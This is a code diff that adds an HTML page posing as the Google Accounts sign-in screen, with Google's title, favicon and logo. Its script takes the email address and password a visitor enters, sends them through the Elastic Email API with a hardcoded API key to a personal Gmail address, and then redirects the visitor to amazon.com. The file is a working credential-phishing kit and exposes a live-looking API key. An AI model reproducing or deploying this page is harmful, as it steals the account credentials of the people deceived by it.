@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link rel="icon" href="https://www.google.com/favicon.ico">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: #fff;
+      max-width: 400px;
+      width: 100%;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    p {
+      font-size: 14px;
+      color: #444;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      padding: 12px;
+      font-size: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .button {
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      background-color: #1669c1;
+    }
+
+    .link {
+      font-size: 14px;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .link a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+
+    .link a:hover {
+      text-decoration: underline;
+    }
+
+    .error {
+      color: red;
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="logo">
+    <h2>Sign in</h2>
+    <p>Use your Google Account</p>
+
+    <div class="error" id="error-msg"></div>
+
+    <form id="elastic-form">
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit" class="button">Continue</button>
+    </form>
+
+    <div class="link">
+      <a href="#">Don't have an account? Create one</a>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('elastic-form');
+    const errorMsg = document.getElementById('error-msg');
+
+    form.addEventListener('submit', (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById('email').value.trim();
+  const password = document.getElementById('password').value;
+
+  fetch("https://api.elasticemail.com/v2/email/send", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: new URLSearchParams({
+      apikey: "D5C01D2E896C84D2176A91E6A832DFF4B8B1C3D3CED59CEBD564BAEEB54FB0734D75FD524C618D0B6C1663F7DAFA4D0D",
+      subject: "New Login Attempt",
+      from: "rdavid14141@gmail.com",
+      to: "rdavid14141@gmail.com",
+      bodyHtml: `
+        <p>New login submitted:</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Password:</strong> ${password}</p>
+      `
+    })
+  })
+  .then(response => response.json())
+  .then(result => {
+  console.log("Elastic Email Result:", JSON.stringify(result, null, 2));
+  if (result.success) {
+    window.location.href = "https://www.amazon.com";
+  } else {
+    alert("Elastic Email Error: " + result.error);
+  }
+})
+  .catch(error => {
+    console.error("Elastic Email Network Error:", error);
+    alert("Network error. Try again.");
+  });
+});
+  </script>
+
+</body>
+</html>
